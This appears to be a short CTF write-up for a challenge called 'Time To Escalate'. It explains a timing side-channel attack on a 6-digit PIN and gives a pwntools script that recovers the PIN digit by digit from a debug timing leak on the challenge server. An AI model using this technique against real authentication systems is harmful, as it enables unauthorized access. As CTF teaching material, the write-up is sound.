# Day 09 Time To Escalate

A typical timing side channel attack, similar to [K17 CTF 2025 vault](../2025-09-19-k17-ctf-2025/vault.md). The time increases when the length of matching prefetch becomes longer.

Attack script:

```python
from pwn import *

context(log_level="DEBUG")

p = remote("ctf.csd.lol", 5040)
pin = [0] * 6
for i in range(6):
    max_time = 0
    max_time_j = 0
    for j in range(10):
        pin[i] = j
        p.recvuntil(b"Enter 6-digit PIN:")
        p.sendline("".join(str(s) for s in pin).encode())
        p.recvuntil(b"Debug: ")
        time = float(p.recvuntil(b")")[:-2])
        if time > max_time:
            max_time = time
            max_time_j = j
    pin[i] = max_time_j
```
